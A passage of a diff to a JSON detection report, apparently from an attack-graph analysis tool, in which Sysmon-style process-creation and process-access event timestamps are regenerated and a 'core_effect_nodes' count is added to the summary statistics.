+        "name": "svchost.exe"
       }
     }
   ],
@@ -654,7 +669,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-06T16:32:14.100238+00:00"
+        "timestamp": "2026-05-08T16:00:30.296974+00:00"
       }
     },
     {
@@ -668,7 +683,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.100238+00:00"
+        "timestamp": "2026-05-08T16:00:30.296974+00:00"
       }
     },
     {
@@ -682,7 +697,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-06T16:32:14.100238+00:00"
+        "timestamp": "2026-05-08T16:00:30.298714+00:00"
       }
     },
     {
@@ -696,7 +711,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.100238+00:00"
+        "timestamp": "2026-05-08T16:00:30.298714+00:00"
       }
     },
     {
@@ -710,7 +725,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-06T16:32:14.100238+00:00"
+        "timestamp": "2026-05-08T16:00:30.298714+00:00"
       }
     },
     {
@@ -724,7 +739,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.103616+00:00"
+        "timestamp": "2026-05-08T16:00:30.298714+00:00"
       }
     },
     {
@@ -738,7 +753,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.860239+00:00"
+        "timestamp": "2026-05-08T16:00:30.540402+00:00"
       }
     },
     {
@@ -752,7 +767,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.869299+00:00"
+        "timestamp": "2026-05-08T16:00:30.552136+00:00"
       }
     },
     {
@@ -766,7 +781,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.871299+00:00"
+        "timestamp": "2026-05-08T16:00:30.553169+00:00"
       }
     },
     {
@@ -780,7 +795,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.874243+00:00"
+        "timestamp": "2026-05-08T16:00:30.553169+00:00"
       }
     },
     {
@@ -794,7 +809,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-06T16:32:14.911331+00:00"
+        "timestamp": "2026-05-08T16:00:30.553169+00:00"
       }
     },
     {
@@ -808,7 +823,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.913206+00:00"
+        "timestamp": "2026-05-08T16:00:30.553169+00:00"
       }
     },
     {
@@ -822,7 +837,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:14.917408+00:00"
+        "timestamp": "2026-05-08T16:00:30.569831+00:00"
       }
     },
     {
@@ -836,7 +851,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-06T16:32:15.348451+00:00"
+        "timestamp": "2026-05-08T16:00:30.703301+00:00"
       }
     },
     {
@@ -931,6 +946,7 @@
     "attack_edges": 20,
     "roots": 6,
     "matched_malicious_nodes": 11,
+    "core_effect_nodes": 9,
     "matched_whitelist_nodes": 105,
     "matched_overlap_whitelist_override_nodes": 0
   }
